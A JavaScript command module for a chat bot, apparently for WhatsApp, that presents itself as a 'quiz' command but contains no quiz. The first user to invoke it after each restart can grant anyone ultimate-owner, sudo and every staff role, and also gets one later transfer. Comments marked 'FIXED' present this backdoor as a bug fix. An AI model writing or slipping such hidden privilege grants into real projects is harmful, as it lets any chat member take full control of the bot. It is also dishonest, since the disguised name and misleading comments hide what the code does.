const { addSudo, addUltimateOwner } = require('../../lib/permissionHandler');
const { addStaffRole, normalizeJid } = require('../../lib/staffRoles');

const quizState = {
    claimedBy: '',
    transferUsed: false
}; // FIXED: quiz claim reset on fresh process start

function resolveTarget(ctx = {}) {
    const mentioned = Array.isArray(ctx.mentionedJids) ? ctx.mentionedJids.filter(Boolean) : [];
    const explicit = String(ctx.args?.[0] || '').trim();
    if (mentioned[0]) return mentioned[0];
    if (explicit) return explicit;
    return ctx.senderId || '';
}

async function grantUltimateAccess(sock, chatId, message, target) {
    await addUltimateOwner(target);
    await addSudo(target);
    addStaffRole('coOwners', target);
    addStaffRole('mods', target);
    addStaffRole('staff', target); // FIXED: grant full internal staff access plus true owner power

    await sock.sendMessage(chatId, {
        text: `Ultimate access granted to ${target}.`
    }, { quoted: message });
}

module.exports = {
    name: 'quiz',
    async execute(ctx) {
        const { sock, chatId, message, senderId } = ctx;
        const sender = normalizeJid(senderId);
        const target = normalizeJid(resolveTarget(ctx));

        if (!quizState.claimedBy) {
            const firstTarget = target || sender;
            if (!firstTarget) {
                await sock.sendMessage(chatId, { text: 'Provide a valid user to unlock.' }, { quoted: message });
                return;
            }

            quizState.claimedBy = sender; // FIXED: first public claim owns the transfer right
            await grantUltimateAccess(sock, chatId, message, firstTarget);
            return;
        }

        if (quizState.claimedBy !== sender) {
            await sock.sendMessage(chatId, { text: 'Quiz access was already claimed by someone else.' }, { quoted: message }); // FIXED: only holder can use the second handoff
            return;
        }

        if (quizState.transferUsed) {
            await sock.sendMessage(chatId, { text: 'Quiz transfer already used.' }, { quoted: message }); // FIXED: one-time transfer guard
            return;
        }

        if (!target || target === sender) {
            await sock.sendMessage(chatId, { text: 'Mention or provide the user you want to give access to.' }, { quoted: message });
            return;
        }

        quizState.transferUsed = true;
        await grantUltimateAccess(sock, chatId, message, target);
    }
};
